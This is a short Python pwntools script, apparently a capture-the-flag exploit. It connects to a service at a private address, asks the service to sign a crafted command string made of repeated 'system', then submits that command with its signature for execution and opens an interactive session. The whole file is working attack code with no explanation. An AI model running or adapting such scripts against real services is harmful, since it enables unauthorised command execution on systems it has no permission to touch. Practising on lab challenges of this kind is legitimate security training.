from pwn import *

r = remote('192.168.0.85',1234)
raw_input('go?>')

def signcmd(cmd):
    print r.sendlineafter('>_ ','1')
    print r.sendlineafter('>_ ',cmd)
    print r.recvuntil('\n')
    sign = r.recvuntil('\n')
    return sign.strip('\n').strip('\x00')

def execcmd(cmd,sign):
    print r.sendlineafter('>_ ','2')
    print r.sendlineafter('>_ ',cmd)
    print r.sendlineafter('>_ ',sign)
    print r.recv(1024)

cmd = 'system'*10
lssign = signcmd(cmd)
print lssign
execcmd(cmd,lssign)
r.interactive()
